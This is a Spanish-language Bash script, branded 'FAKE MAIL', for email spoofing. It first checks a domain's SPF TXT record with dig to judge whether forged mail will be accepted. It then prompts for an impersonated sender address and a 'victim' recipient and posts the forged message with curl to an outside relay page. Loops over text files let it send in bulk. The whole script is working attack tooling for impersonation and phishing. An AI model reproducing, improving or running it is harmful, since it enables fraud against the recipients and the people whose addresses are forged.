#!/bin/bash
clear
Banner(){
echo -e '

███████╗ █████╗ ██╗  ██╗███████╗    ███╗   ███╗ █████╗ ██╗██╗     
██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ████╗ ████║██╔══██╗██║██║     
█████╗  ███████║█████╔╝ █████╗      ██╔████╔██║███████║██║██║     
██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ██║╚██╔╝██║██╔══██║██║██║     
██║     ██║  ██║██║  ██╗███████╗    ██║ ╚═╝ ██║██║  ██║██║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                  
'
echo '*****************have fun*****************'
echo '*****created by : Sombrero Negro MX  *****'

}

consulta~all(){

dig $dom txt | grep ~all
echo "Este Dominio Se ecncuentra con una configuración ´~all´ en los DNS's del servidor de correo,lo que quiere decir que existen posibilidades de que no funcione, todo va a depender del servido de correo que resiva el correo"
enterInicial

}
consulta-all(){

dig $dom txt | grep -all
echo "Este correo se encuentra con una configuracion ´-all´ en los DNS's lo que quiere decir que este correo no podra utilizarce para realizar Email Spoofing"
enterInicial

}
consultaAll(){
dig $dom txt | grep ?all
echo 'Informacion no encontrada'
enterInicial

}
enterInicial(){
echo -e '\e[96mPrecione ENTER para volver al menu Principal'
read ENTER  
case $ENTER in 
	*)
		menuInicial
esac
}
enviarDestinoMas(){
	clear
	Banner
	echo 'Victima/Destino -->' $destino
	echo 'Mensaje'
	read mensaje
	clear
	Banner
	echo 'Victima/Destino -->' $destino
	echo 'Mensaje -->' $mensaje
	echo 'Asunto'
	read asunto
	clear
	Banner
	echo 'Victima/Destino -->' $destino
	echo 'Mensaje -->' $mensaje
	echo 'Asunto -->' $asunto
	echo 'Listo? [s/n]'
	read listo 
	case $listo in
		s)
			for destino in $(cat destinatarios.txt); 
				do 
					curl --data "remitente=$destino && asunto=$asunto && msj=$mensaje && desde=$remitente" http://snmx.000webhostapp.com/send.php
			done	
			;;
		n)
			clear
			Banner
			menuInicial
			;;
	esac
}
enviarRemitenteMas(){
clear
	Banner
	echo 'Mensaje'
	read mensaje
	echo 'Asunto'
	read asunto
	echo 'Listo? [s/n]'
	read listo 
	case $listo in
		s)
			for remitente in $(cat remitente.txt); 
				do 
					curl --data "remitente=$destino && asunto=$asunto && msj=$mensaje && desde=$remitente" http://snmx.000webhostapp.com/send.php
			done	
			;;
		n)
			clear
			Banner
			menuInicial
			;;
	esac

}

enviarUnCorreo(){
clear
		Banner
		echo 'Direccion de coreo electronico suplantado'
		read remitente
		clear
		Banner
		echo 'Remitente -->' $remitente
		echo 'Direccion de correo receptor'
		read receptor
		clear
		Banner
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo'
		read asunto 
		clear
		Banner
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo -->' $asunto
		echo 'Mensaje'
		read mensaje
		clear
		Banner
		echo 'Remitente -->' $remitente
		echo 'Receptor del correo -->' $receptor
		echo 'Asunto del correo -->' $asunto
		echo 'Mensaje -->'$mensaje
		echo '¿Estas Seguro que deceas enviar este mensaje? [s/n]' 
		read Seguro
		case $Seguro in
			s)
				curl --data "remitente=$receptor && asunto=$asunto && msj=$mensaje && desde=$remitente" https://snmx.000webhostapp.com/send.php 
				;;	
			n)
				clear
				Banner 
				menuInicial
		esac

}

masDeUno(){
clear
Banner
echo '¿quien es el común? Remetitente[r] ó Destinatarios[d]: [r/d]'
read comun
case $comun in
	r)
		clear
		Banner
		echo 'Para cargar mas de un Email de destino porfavor escriba los correos en el archivo "destinatarios.txt" que se ubica en la misma carpeta'
		echo 'uno debajo del otro'
		echo 'Ej:'
		echo 'example@gmail.com'
		echo 'example2@gmail.com'
		echo 'example3@gmail.com'
		echo 'Precione ENTER para continuar'
		read 
		echo 'Direccion de coreo electronico suplantado'
		read remitente
		clear
		Banner
		echo 'Remitente -->' $remitente
		for destino in $(cat destinatarios.txt); 
			do 
				echo 'Destinatario -->' $destino	
		done
		echo '¿Esta su lista completa? [s/n]'
		read completa [s/n]
		case $completa in
			s)
				clear
				Banner
				enviarDestinoMas
				;;
			n)
				clear
				Banner
				menuInicial
				;;
		esac
		;;
	d)
		clear
		Banner
		echo 'Para cargar mas de un Email de suplantados porfavor escriba los correos en el archivo "remitente.txt" que se ubica en la misma carpeta'
		echo 'uno debajo del otro'
		echo 'Ej:'
		echo 'example@gmail.com'
		echo 'example2@gmail.com'
		echo 'example3@gmail.com'
		echo 'Precione ENTER para continuar'
		read
		echo 'Direccion de correo electronico de la victima'
		read destino
		clear
		Banner
		echo 'Destino -->' $destino
		for remitente in $(cat remitente.txt); 
			do 
				echo 'Remitente -->' $remitente	
		done
				echo '¿Esta su lista completa? [s/n]'
				read completa 
				enviarDestinoMas

;;
esac
}

menuInicial(){
clear
Banner	
echo -e '\e[92mSeleccione la opción que decea utilizar'
echo ''
echo '1) Verificar si el correo de remitente es vulnerable a ser suplantado con Email Spoofing'
echo '2) Iniciar suplantacaión'
read opcion
case $opcion in 
	1)
		clear
		Banner
		echo 'Digite el DOMINIO el cual decea analizar'
		read dom 
		clear
		Banner
		dig $dom txt | grep all
		#consultaDns = dig $dom txt
		echo
		echo
		echo -e '\e[91mLas consultas que terminen con "~all" quieren decir que existen posibilidades de que el Email sea aceptado, pero tamquien que no sea aceptado, todo depende del servidor de llegada'
		echo
		echo 'Las consultas que terminen con -all quiere decir que de que no se aceptara este correo'
		echo
		echo 'Cualquier otra funcionara correctamente' 
		echo
		enterInicial
	;;
	2)
		clear
		Banner
		echo "Cuantos correos decea enviar: "
		echo "1) Un solo correo"
		echo "2) Mas de uno"
		read cuantos
		case $cuantos in
			1)
				enviarUnCorreo
				;;
			2)
				masDeUno			
				;;
		esac
esac
}

Banner 
menuInicial
